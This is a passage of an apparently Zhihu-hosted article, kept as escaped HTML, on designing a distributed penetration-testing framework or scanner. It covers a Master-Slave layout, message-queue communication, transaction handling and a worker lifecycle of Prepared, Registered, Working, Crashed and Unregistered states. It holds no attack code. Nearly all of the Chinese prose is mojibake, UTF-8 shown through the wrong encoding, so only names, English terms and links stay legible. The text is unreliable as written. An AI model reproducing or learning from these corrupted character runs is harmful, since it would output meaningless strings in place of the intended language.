¸æ¶æ„ï¼šè¿™ç§æ¶æ„éå¸¸çµæ´»ï¼Œæ—¢å¯ä»¥ä½œä¸ºéƒ¨åˆ†ä¹Ÿå¯ä»¥ä½œä¸ºæ•´ä½“æ¡†æ¶ä½¿ç”¨ã€‚æ¯”å¦‚å¸¸è§çš„è„šæœ¬å¼•æ“ï¼šNmap çš„ NSE ç³»ç»Ÿï¼ŒSQLMAP çš„ Tamper æœºåˆ¶ç­‰ç­‰ï¼Œå…¶å®å¯ä»¥è¯´ç”¨åˆ°äº†å¾®å†…æ ¸æ¨¡å‹çš„ä¸€äº›æ€æƒ³ã€‚&lt;/li&gt;&lt;li&gt;å¾®å†…æ ¸ä¸ä¸»ä»ï¼šå¾®å†…æ ¸é‡‡ç”¨ä¸»ä»æ¨¡å‹ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šè§£è€¦åŠŸèƒ½æ¨¡å—ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8c583d205528f259751b8ca0dda81fcc_r.png&quot; data-rawwidth=&quot;1462&quot; data-rawheight=&quot;762&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;åœ¨ä¸‹ä¸€ä¸ªè¯é¢˜ä¸­ï¼Œæˆ‘ä»¬è®¨è®ºåˆ†å¸ƒå¼æ¸—é€æ¡†æ¶ï¼æ‰«æå™¨çš„æ¶æ„è®¾è®¡ç›¸å…³çš„è¯é¢˜ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Topic - éœ€æ±‚åˆ†æä¸æ¶æ„è®¾è®¡&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;èƒŒæ™¯&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;ç®€å•æ¥è¯´è¿™ä¸ªæ¡†æ¶çš„ä»»åŠ¡å°±æ˜¯ï¼Œæ¥æ”¶ä»»åŠ¡ï¼Œåˆ†å‘ä»»åŠ¡ï¼Œæ‰§è¡Œä»»åŠ¡ï¼Œå¤„ç†ç»“æœï¼Œå› æ­¤åˆ†å¸ƒå¼æ¸—é€æµ‹è¯•æ¡†æ¶ç›¸å¯¹äºç”µå•†å¹³å°çš„å¾®æœåŠ¡æ¶æ„è¦ç®€å•å¾ˆå¤šï¼Œå› ä¸ºæ¸—é€æµ‹è¯•æ¡†æ¶çš„äº‹åŠ¡ç›¸å¯¹æ›´ä½³ç®€å•ä¸€äº›ï¼Œç”šè‡³å¯ä»¥è¯´æ·¡åŒ–äº‹åŠ¡è¿™ä¸ªæ¦‚å¿µã€‚ä½†æ˜¯åˆå±äºä»»åŠ¡å¯†é›†å‹çš„åº”ç”¨ï¼Œä¸€å®šç¨‹åº¦ä¸Šé«˜å¹¶å‘å’Œé«˜å¯ç”¨æ€§åˆå­˜åœ¨ä¸€å®šçš„éœ€æ±‚ã€‚&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬å¯ä»¥ä»å¤´æ¢³ç†ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹ï¼ŒMaster å¾—åˆ°ä¸€ä¸ªä»»åŠ¡ï¼Œè¿™ä¸ªä»»åŠ¡è¢«åˆ†ä¸ºå‡ ä¸ªåŸå­ä»»åŠ¡ï¼ŒæŒ‰ç…§ç§ç±»è¢«é€ç»™äº†ä¸åŒçš„ Workerï¼Œç„¶åä»»åŠ¡æ‰§è¡Œä¹‹åï¼Œç»“æœè¢«å‘é€ä¼š Masterï¼Œè¿›è¡Œäº‹åŠ¡æ±‡æ€»ã€‚&lt;/p&gt;&lt;p&gt;æ•´ä¸ªè¿‡ç¨‹è™½ç„¶å¹¶ä¸æ˜¯éå¸¸çš„å¤æ‚ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯éœ€è¦åˆ†æä¸€ä¸‹æˆ‘ä»¬åˆ°åº•éœ€è¦ä»€ä¹ˆæ‰èƒ½é’ˆå¯¹éœ€æ±‚ä½œå‡ºåˆç†çš„æ¶æ„è®¾è®¡&lt;/p&gt;&lt;h2&gt;&lt;b&gt;éœ€æ±‚&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æ€è€ƒäº†å¾ˆå¤šå…³äºéœ€æ±‚æè¿°çš„æ–¹æ³•ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠæ³•åªä»ä¸€ä¸ªè§’åº¦å¾ˆå¥½çš„æè¿°æˆ‘ä»¬çš„ç³»ç»Ÿåˆ°åº•éœ€è¦ä»€ä¹ˆæ ·çš„åŠŸèƒ½ï¼Œè¿™å°±å¥½æ¯”æˆ‘ä»¬æœ‰äº† OOPï¼Œä½†æ˜¯ AOP çš„å‡ºç°è¿›è¡Œäº†å¯¹ OOP éå¸¸å¥½çš„è¡¥å……ï¼Œå½“ç„¶è¿˜æœ‰ SOPï¼ˆé¢å‘çŠ¶æ€ç¼–ç¨‹ï¼‰ä¹Ÿå¯¹ OOP çš„èµ·åˆ°äº†å¾ˆå¥½çš„è¡¥å……ã€‚å•Šï¼Œè¯é¢˜æ‰¯è¿œäº†ï¼Œç»è¿‡ä¸€äº›æ€è€ƒï¼Œåˆ†åˆ«ä»ç©ºé—´å’Œæ—¶é—´ï¼ˆè¿‡ç¨‹ï¼é€»è¾‘ï¼‰ä¸¤ä¸ªè§’åº¦æ¥è®¨è®ºæˆ‘ä»¬çš„éœ€æ±‚ã€‚&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ç©ºé—´è§’åº¦æ˜¯æŒ‡å¯¹è±¡ï¼Œè¡Œä¸ºï¼Œæ•°æ®ï¼Œå®ä½“è§’åº¦ä¸ä¼ ç»Ÿçš„ OOP çš„æ€è€ƒè§’åº¦ç±»ä¼¼ï¼Œå°±ä¸åšè¿‡å¤šçš„èµ˜è¿°äº†ã€‚&lt;/li&gt;&lt;li&gt;æ—¶é—´ï¼è¿‡ç¨‹ï¼é€»è¾‘è§’åº¦æŒ‡çš„æ˜¯æˆ‘ä»¬ä»ä¸ªè¡Œä¸ºä»å¼€å§‹åˆ°ç»“æŸæ•´ä¸ªè¿‡ç¨‹æ¥æ€è€ƒé—®é¢˜ï¼Œå°±æ¯”å¦‚ï¼Œä» Master åˆ° Slave é€šä¿¡çš„æ•´ä¸ªè¿‡ç¨‹ï¼Œä¸€ä¸ªäº‹åŠ¡çš„ç”Ÿå­˜å‘¨æœŸï¼ˆä»»åŠ¡ä»äº§ç”Ÿåˆ°ç»“æŸæˆ–è€…è¢«ä¸¢å¼ƒï¼‰ï¼Œä¸€ä¸ªæ¨¡å—çš„ç”Ÿå­˜å‘¨æœŸï¼Œä¸€ä¸ªå­˜åœ¨ä¸»é€»è¾‘çš„è°ƒåº¦è¿‡ç¨‹ç­‰ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;ç©ºé—´éœ€æ±‚&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;ä»åŠŸèƒ½å®ä½“çš„è§’åº¦æ¥è¯´ï¼Œæˆ‘ä»¬å¤§æ¦‚éœ€è¦è¿™æ ·çš„ä¸œè¥¿ï¼š&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Master&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;äº‹åŠ¡ç®¡ç†&lt;/li&gt;&lt;ul&gt;&lt;li&gt;ä»»åŠ¡æ¥æ”¶&lt;/li&gt;&lt;li&gt;ä»»åŠ¡åˆ†å‘&lt;/li&gt;&lt;li&gt;ç»“æœæ”¶é›†&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;èŠ‚ç‚¹ç®¡ç†&lt;/li&gt;&lt;ul&gt;&lt;li&gt;èŠ‚ç‚¹å®¡è®¡ï¼ˆInspectï¼‰&lt;/li&gt;&lt;li&gt;èŠ‚ç‚¹å¯åœï¼ˆStart / Stopï¼‰&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;ç”¨æˆ·ç®¡ç†&lt;/li&gt;&lt;ul&gt;&lt;li&gt;ç•¥&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;Slave&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;çŠ¶æ€æ— å…³&lt;/li&gt;&lt;li&gt;äº‹åŠ¡å¤„ç†&lt;/li&gt;&lt;ul&gt;&lt;li&gt;ä»»åŠ¡æ‰§è¡Œ&lt;/li&gt;&lt;li&gt;ç»“æœè¿”å›&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;èŠ‚ç‚¹ç®¡ç†&lt;/li&gt;&lt;ul&gt;&lt;li&gt;èŠ‚ç‚¹çŠ¶æ€æ±‡æŠ¥&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;æ—¶é—´ï¼è¿‡ç¨‹ï¼é€»è¾‘éœ€æ±‚&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å½“ç„¶è¿™é‡ŒæŒ‡çš„æ˜¯æœ¬æ¡†æ¶ä¸­ä¸ºäº†è§£å†³é—®é¢˜ä»è€Œéœ€è¦çš„ä¸€ç³»åˆ—çš„æœºåˆ¶æˆ–è€…å¯èƒ½å‡ºç°çš„è¿‡ç¨‹æˆ–è€…é€»è¾‘&lt;/p&gt;&lt;ul&gt;&lt;li&gt;é€šä¿¡ç³»ç»Ÿï¼ˆç¨åä¼šè¯¦ç»†è®¨è®ºï¼‰&lt;/li&gt;&lt;li&gt;äº‹åŠ¡ç³»ç»Ÿ&lt;/li&gt;&lt;ul&gt;&lt;li&gt;ä»»åŠ¡ç®¡ç†ç³»ç»Ÿ&lt;/li&gt;&lt;li&gt;ç»“æœç®¡ç†ç³»ç»Ÿ&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;åŠŸèƒ½æ¨¡å—å¼•æ“&lt;/li&gt;&lt;li&gt;é«˜åº¦æ¨¡å—åŒ–ï¼šæŒ‡çš„æ˜¯æ¨¡å—ä¹‹é—´é«˜åº¦ç‹¬ç«‹ï¼Œæä½è€¦åˆç”šè‡³æ²¡æœ‰è€¦åˆ&lt;/li&gt;&lt;li&gt;ä½¿ç”¨è„šæœ¬å¼•æ“æå‡çµæ´»æ€§ï¼šé’ˆå¯¹ä¸å¿…è¦æ–°å»ºæ¨¡å—çš„å°å‹ä»»åŠ¡ï¼Œä»…ä½¿ç”¨ä¸€ä¸ªè„šæœ¬å¼•æ“æ¥æ•æ·å¯åŠ¨å’Œæ‰§è¡Œä»»åŠ¡&lt;/li&gt;&lt;li&gt;å¯¹æ¡†æ¶çš„ä½ä¾èµ–ï¼šæ¨¡å—æŒ‰ç…§ä¸€å®šè§„èŒƒç¼–å†™è€Œæˆï¼Œä¸éœ€è¦å‘æ¡†æ¶æä¾›ä»»ä½•æ¥å£&lt;/li&gt;&lt;li&gt;æ¥å£ç»Ÿä¸€ï¼Œä½†æ˜¯æ¨¡å—æœ¬èº«ç¯å¢ƒçš„å¤šæ ·æ€§ï¼šæ¨¡å—å¯ä»¥æ˜¯ä»»æ„çš„è¯­è¨€ï¼Œä»»æ„çš„ç¯å¢ƒï¼Œä»»æ„å®¹å™¨ï¼Œä½†æ˜¯æ¨¡å—çš„æ¥å£å¿…é¡»æ˜¯æ¡†æ¶å¯ä»¥æ¥å—çš„&lt;/li&gt;&lt;li&gt;è°ƒåº¦ç³»ç»Ÿ&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;å­˜åœ¨ä¸€ä¸ªå¯ä»¥è®©æ¨¡å—ååŒå·¥ä½œçš„è°ƒåº¦ç³»ç»Ÿã€‚&lt;/p&gt;&lt;ol&gt;&lt;li&gt;ç”¨æˆ·æ¥å£ï¼ˆç•¥ï¼‰&lt;/li&gt;&lt;li&gt;æ¡†æ¶æ‰©å±•ç³»ç»Ÿ&lt;/li&gt;&lt;ol&gt;&lt;li&gt;ä»»åŠ¡è„šæœ¬ SDK&lt;/li&gt;&lt;li&gt;å…³é”®ç‚¹ï¼å…³é”®æ¶ˆæ¯é˜Ÿåˆ—æ‹“å±•&lt;/li&gt;&lt;/ol&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;è®¾è®¡&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æ ¹æ®æˆ‘ä»¬éœ€æ±‚ï¼Œæœ€ç®€å•çš„ï¼Œæˆ‘ä»¬æ•´ä½“çš„æ¶æ„åº”è¯¥æ˜¯ä¸€ä¸ªæ¾æ•£çš„ Master-Slave æ¶æ„ï¼ŒMaster å¹¶ä¸ä¾èµ–ä»»ä½• Slaveï¼Œä½†æ˜¯ Slave å¿…é¡»ä¾é™„äº Master æ‰å¯ä»¥å·¥ä½œã€‚&lt;/p&gt;&lt;p&gt;åœ¨è¿›è¡Œä¸‹é¢çš„å™è¿°è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆçº¦å®šä¸€ä¸‹åœ¨æˆ‘ä»¬çš„æ¡†æ¶ä¸­è¦å‡ºç°çš„å‡ ä¸ªæ¦‚å¿µï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Master - ä¸»æ§å®ä½“&lt;/li&gt;&lt;li&gt;MQ è¿æ¥ Master ä¸ Slave æ‰€æœ‰æœåŠ¡é€šä¿¡çš„ä¸­é—´ä»¶&lt;/li&gt;&lt;li&gt;Slave - å…·ä½“æ‰§è¡Œä¸šåŠ¡çš„å®ä½“&lt;/li&gt;&lt;ul&gt;&lt;li&gt;åŠŸèƒ½å•å…ƒï¼šå…·å¤‡ä¸€ç§æ‰§è¡Œä»»åŠ¡çš„èƒ½åŠ›ï¼Œä½†æ˜¯åªèƒ½æ‰§è¡Œä¸€ç§ï¼Œå¯ä»¥ç›´æ¥å‘ Master æ±‡æŠ¥ç”Ÿå­˜çŠ¶å†µå’Œç»“æœï¼Œè„±ç¦»èŠ‚ç‚¹ä¹Ÿå¯ä»¥å­˜åœ¨&lt;/li&gt;&lt;li&gt;èŠ‚ç‚¹ï¼šå¯ä»¥ç®¡ç†å¤šä¸ªåŠŸèƒ½å•å…ƒï¼Œä½†æ˜¯ä¸å®ç°æ‰§è¡Œä»»åŠ¡çš„æ¥å£ï¼Œä¹Ÿå¹¶æ²¡æœ‰æ‰§è¡Œä»»åŠ¡çš„èƒ½åŠ›ï¼Œå¯ä»¥ç›´æ¥å‘ Master æ±‡æŠ¥ç”Ÿå­˜çŠ¶å†µå’Œç»“æœï¼ˆç»“æœæ¥æºäºåŠŸèƒ½å•å…ƒï¼‰&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;å¥½çš„ï¼Œæˆ‘ä»¬ç”¨ä¸‹é¢è¿™ä¸ªå›¾æ¥ç®€å•è¯´æ˜ä¸€ä¸‹ç»“æ„&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-81d9fb3e1c608427fe039f5593543493_r.jpg&quot; data-rawwidth=&quot;2043&quot; data-rawheight=&quot;2149&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;åŒæ—¶ï¼Œè¿™ä¸ªæ•´ä½“çš„æ¶æ„å¹¶ä¸å¤Ÿæˆ‘ä»¬æè¿°æ•´ä¸ªæ¡†æ¶ï¼Œä¹Ÿæ˜¾å¾—éå¸¸æ•·è¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾ˆæœ‰å¿…è¦åšè¯¦ç»†çš„é˜è¿°ï¼š&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Master æ‹†åˆ†æœåŠ¡ä¸å­åŠŸèƒ½&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Master æ˜¯ä¸€ä¸ªå·¨å¤§çš„åŠŸèƒ½é›†åˆï¼Œä½†æ˜¯å¹¶ä¸æ˜¯ä¸€ä¸ªâ€œç‰›ç±»â€è¿™æ ·çš„ä¸œè¥¿ï¼ŒMaster æ˜¯ç”±å¾ˆå¤šä¸ªæœåŠ¡æ„æˆçš„ï¼Œå› æ­¤æˆ‘ä»¬éå¸¸æœ‰å¿…è¦æŠŠ Master æ‹†åˆ†æˆå…·ä½“çš„æœåŠ¡æ¥åˆ†åˆ«é˜è¿°å…¶ç”¨é€”ã€‚&lt;/p&gt;&lt;ul&gt;&lt;li&gt;é€šä¿¡æœåŠ¡&lt;/li&gt;&lt;li&gt;èŠ‚ç‚¹å’Œæ¨¡å—ç®¡ç†æœåŠ¡ï¼šæä¾›å¯¹ Slave çš„ç®¡ç†åŠŸèƒ½&lt;/li&gt;&lt;ul&gt;&lt;li&gt;èŠ‚ç‚¹ç®¡ç†å­æœåŠ¡&lt;/li&gt;&lt;li&gt;æ¨¡å—ï¼ˆåŠŸèƒ½å•å…ƒï¼‰ç®¡ç†å­æœåŠ¡&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;æ¨¡å—è°ƒåº¦æœåŠ¡ï¼šè°ƒåº¦æ¨¡å—ï¼åŠŸèƒ½å•å…ƒä¹‹é—´çš„åä½œé€»è¾‘&lt;/li&gt;&lt;li&gt;äº‹åŠ¡å¤„ç†æœåŠ¡&lt;/li&gt;&lt;ul&gt;&lt;li&gt;ä»»åŠ¡å¤„ç†å­æœåŠ¡&lt;/li&gt;&lt;li&gt;ç»“æœå¤„ç†å­æœåŠ¡&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;æŒä¹…åŒ–æœåŠ¡ï¼šå­˜å‚¨ä»»åŠ¡å’Œç»“æœ&lt;/li&gt;&lt;li&gt;ç”¨æˆ·æœåŠ¡&lt;/li&gt;&lt;ul&gt;&lt;li&gt;ç”¨æˆ·é‰´æƒä¸ç®¡ç†ï¼ˆåæœŸï¼‰&lt;/li&gt;&lt;li&gt;ç”¨æˆ·æ¥å£&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3db80851b08aec077b2bbae03bfde28e_r.png&quot; data-rawwidth=&quot;1137&quot; data-rawheight=&quot;386&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Slave æ‹†åˆ†æœåŠ¡ä¸å­åŠŸèƒ½&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;èŠ‚ç‚¹æœåŠ¡&lt;/li&gt;&lt;ul&gt;&lt;li&gt;Master é€šä¿¡æœåŠ¡&lt;/li&gt;&lt;ul&gt;&lt;li&gt;æ§åˆ¶ä¿¡é“ï¼šä¼ é€’ä¸»æ§èŠ‚ç‚¹çš„æ§åˆ¶ä¿¡æ¯&lt;/li&gt;&lt;li&gt;ä»»åŠ¡ä¿¡é“ï¼šä»»åŠ¡æ¥æ”¶ä¿¡é“&lt;/li&gt;&lt;li&gt;ç»“æœä¿¡é“ï¼šç»“æœæ±‡æŠ¥&lt;/li&gt;&lt;li&gt;æ±‡æŠ¥ä¿¡é“ï¼šé¢å¤–ä¿¡æ¯æ±‡æŠ¥&lt;/li&gt;&lt;li&gt;â€¦...&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;åŠŸèƒ½å•å…ƒç®¡ç†å­æœåŠ¡&lt;/li&gt;&lt;li&gt;åŠŸèƒ½å•å…ƒä½¿ç”¨å­æœåŠ¡&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;åŠŸèƒ½å•å…ƒæœåŠ¡&lt;/li&gt;&lt;ul&gt;&lt;li&gt;æ¥æ”¶ä»»åŠ¡&lt;/li&gt;&lt;li&gt;æ£€æŸ¥å‚æ•°ä¸åˆç†æ€§&lt;/li&gt;&lt;li&gt;æ‰§è¡Œä»»åŠ¡&lt;/li&gt;&lt;li&gt;è¿”å›æœ€ç»ˆç»“æœæˆ–è€…é˜¶æ®µæ€§ç»“æœ&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b024368c6c0474605a9cb5830deda05d_r.png&quot; data-rawwidth=&quot;544&quot; data-rawheight=&quot;403&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;å…¶ä»–è®¾å¤‡&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆé›†ç¾¤ï¼‰ï¼šåœ¨ä¸‹ä¸€ä¸ª Topic ä¼šç€é‡æ¢è®¨ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;è¿‡ç¨‹è®¾è®¡&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;è®¾è®¡å¯¹åº”éœ€æ±‚ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦å¯¹é‡è¦çš„è¿‡ç¨‹è¿›è¡Œè®¾è®¡ï¼Œå’Œä¸Šé¢æœåŠ¡ï¼åŠŸèƒ½æ‹†åˆ†æ˜¯ä¸åŒçš„è§’åº¦ï¼Œä½†æ˜¯ä¹Ÿå¾ˆå¥½çš„å¯ä»¥æè¿°å‡ºæ¡†æ¶å·¥ä½œçš„è¿‡ç¨‹ã€‚æ‰€ä»¥æˆ‘ä¸ªäººè§‰çš„è¿™ä¸ªè§’åº¦æ¥åšä¸€äº›è¯´æ˜æ˜¯éå¸¸æœ‰å¿…è¦çš„ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;äº‹åŠ¡å¤„ç†æµç¨‹&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;äº‹åŠ¡å¤„ç†ä¸è®ºæ˜¯åœ¨å„ç§é—¨æˆ·çš„å¾®æœåŠ¡æ¶æ„ä¸­è¿˜æ˜¯åœ¨ç”µå•†å¾®æœåŠ¡æ¶æ„éƒ½èµ·ç€éå¸¸é‡è¦çš„ä½œç”¨ï¼š&lt;/p&gt;&lt;p&gt;äº‹åŠ¡çš„å­˜åœ¨æ˜¯ä¸ºäº†ä¿éšœä»»åŠ¡æ‰§è¡Œçš„å®Œæ•´æ€§å’Œç²¾ç¡®æ€§ï¼Œä¸¾ä¸ªä¾‹å­è¯´æ˜äº‹åŠ¡çš„å­˜åœ¨çš„å¿…è¦ï¼šå½“ä½ çš„äº‹æƒ…å¼€å§‹æ‰§è¡Œäº†ï¼Œä½†æ˜¯ç”±äºèŠ‚ç‚¹å´©æºƒæˆ–è€…ç½‘ç»œåŸå› ï¼Œæ²¡æœ‰åŠæ³•æˆåŠŸæ‰§è¡Œè¿™ä¸ªæ“ä½œï¼Œåœ¨æ”¶åˆ°æ‰§è¡Œå¤±è´¥çš„ä¿¡å·ä¹‹åï¼Œäº‹åŠ¡ä¼šå›æ»šåˆ°ä¸Šä¸€ä¸ªå®‰å…¨çš„çŠ¶æ€ï¼Œè¿™æ ·å°±é¿å…äº† Pending è¿™ç§è–›å®šè°”çŠ¶æ€ï¼Œä¹Ÿæ˜¯æœ€ç»ˆä¸€è‡´æ€§çš„ä¸€ç§ä½“ç°æˆ–è€…å®ç°æ–¹æ³•å§ï¼ˆå½“ç„¶äº‹åŠ¡æ§åˆ¶ä¸­å¿ƒæˆ‘ä»¬è¿™é‡Œåªè®¾ç½®ä¸€ä¸ªï¼Œå°±ä¸å­˜åœ¨å¤šä¸ªäº‹ç‰©æ§åˆ¶ä¸­å¿ƒæ•°æ®çš„éœ€è¦å¼ºåŒæ­¥çš„é—®é¢˜äº†ï¼‰&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬åœ¨è®¾è®¡è¿™ä¸ªæ¡†æ¶çš„æ—¶å€™æœ‰æ„å°†äº‹åŠ¡è¿™ä¸ªæ¦‚å¿µå¼•å…¥æˆ‘ä»¬çš„æ¡†æ¶ï¼Œè¿ç”¨æœ€ç»ˆä¸€è‡´æ€§å¤„ç†äº‹åŠ¡å¤„ç†&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f98323bfcc214ecf1f87e9cebc52dd6c_r.jpg&quot; data-rawwidth=&quot;2087&quot; data-rawheight=&quot;2888&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;åŠŸèƒ½å•å…ƒç”Ÿå­˜å‘¨æœŸ&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å½“ç„¶ç†åº”æ‰€æœ‰çš„åŠŸèƒ½å®ä½“éƒ½åº”è¯¥æœ‰ä¸€ä¸ªçŠ¶æ€æœºï¼Œä½†æ˜¯ç”±äºç¯‡å¹…æ‰€é™ï¼Œæˆ‘ä»¬å°±ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼ŒåŠŸèƒ½å•å…ƒçš„ç”Ÿå­˜å‘¨æœŸçŠ¶æ€å›¾å¦‚ä¸‹&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-03f710d46c578d1afe8ae37734ac28ba_r.jpg&quot; data-rawwidth=&quot;1570&quot; data-rawheight=&quot;660&quot;&gt;&lt;p&gt;åœ¨åŠŸèƒ½å•å…ƒå¯åŠ¨ä¹‹åï¼Œé¦–å…ˆè¿›å…¥åˆå§‹çŠ¶æ€ï¼Œè¿›è¡Œåˆå§‹åŒ–ï¼Œåˆå§‹åŒ–æˆåŠŸåˆ™è¿›å…¥ Prepared çŠ¶æ€ï¼Œå¦‚æœåˆå§‹åŒ–å¤±è´¥ï¼Œé€ æˆåŠŸèƒ½å•å…ƒå´©æºƒï¼Œåˆ™è¿›å…¥å´©æºƒå¤„ç†æµç¨‹ã€‚&lt;/p&gt;&lt;p&gt;åœ¨ Prepared çŠ¶æ€ä¸‹ï¼ŒåŠŸèƒ½å•å…ƒè‡ªåŠ¨å‘èµ·æ³¨å†Œåˆ° Masterï¼Œå¦‚æœæ³¨å†ŒæˆåŠŸï¼Œæ”¹å˜çŠ¶æ€ä¸º Registeredï¼Œå¦‚æœå¤±è´¥ï¼Œè¿›å…¥ Unregistered çŠ¶æ€ã€‚&lt;/p&gt;&lt;p&gt;Registered çŠ¶æ€ç›´æ¥è¿›å…¥ Working çŠ¶æ€ï¼ŒWorking çŠ¶æ€ä¸‹ï¼Œä¼šå®šæ—¶å‘é€å¿ƒè·³ï¼ˆæˆ–è€…å…¶ä»–æœºåˆ¶æ¥ä¿è¯ä¸ Masterï¼‰è¿æ¥ï¼Œå¦‚æœå‘ç”Ÿå¤šæ¬¡è¿æ¥æ–­å¼€ï¼Œåˆ™è¿›å…¥ Unregistered çŠ¶æ€ã€‚åŒæ—¶åœ¨ Working çŠ¶æ€ä¸‹è¿›è¡Œäº‹åŠ¡å¤„ç†ï¼ˆç•¥ï¼‰ã€‚å¦‚æœäº‹åŠ¡å¤„ç†è¿‡ç¨‹ä¸­ç¨‹åºé­é‡åˆ°ä¸å¯è§£å†³çš„å´©æºƒï¼Œåˆ™è¿›å…¥ Crashed çŠ¶æ€ã€‚&lt;/p&gt;&lt;p&gt;Crashed çŠ¶æ€ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦é‡ç½®åŠŸèƒ½å•å…ƒå†³å®šæ˜¯åœæ­¢åŠŸèƒ½å•å…ƒï¼Œè¿˜æ˜¯é‡å¯ã€‚&lt;/p&gt;&lt;p&gt;Unregistered çŠ¶æ€ä¼šè‡ªåŠ¨å…³é—­åŠŸèƒ½å•å…ƒï¼Œå› ä¸º Unregistered æ˜¯ä¸€ä¸ªæ ‡å¿—ç€åŠŸèƒ½å•å…ƒæ­£å¸¸ç»“æŸçš„å•å…ƒã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;åœ¨ä¸Šä¸€ä¸ªè¯é¢˜ä¸­ï¼Œæˆ‘ä»¬å…³äºæ¶ˆæ¯é˜Ÿåˆ—ï¼ˆé€šä¿¡ï¼‰çš„éƒ¨åˆ†å¹¶æ²¡æœ‰åšå¤ªå¤šçš„æè¿°ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±åœ¨ä¸‹ä¸€ä¸ªè¯é¢˜ä¸­å…·ä½“é˜è¿°ä¸€ä¸‹å…³äºèŠ‚ç‚¹é€šä¿¡çš„é—®é¢˜ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Topic - é€šä¿¡ä¸æ¶ˆæ¯é˜Ÿåˆ—&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æœ¬éƒ¨åˆ†ä¸å¤§å®¶ç®€å•æ¢è®¨æœ¬æ¡†æ¶çš„æ¶æ„ä¸æ¶ˆæ¯é˜Ÿåˆ—çš„å…³ç³»å’Œå¯¹æ¶ˆæ¯é˜Ÿåˆ—çš„è®¾è®¡ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;æ¶ˆæ¯é˜Ÿåˆ—åŸºç¡€&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;å‚è€ƒèµ„æ–™ï¼š&lt;a href=&quot;https://tech.meituan.com/mq-design.html&quot;&gt;https://tech.meituan.com/mq-design.html&lt;/a&gt;&lt;br&gt;RabbitMQ: &lt;a 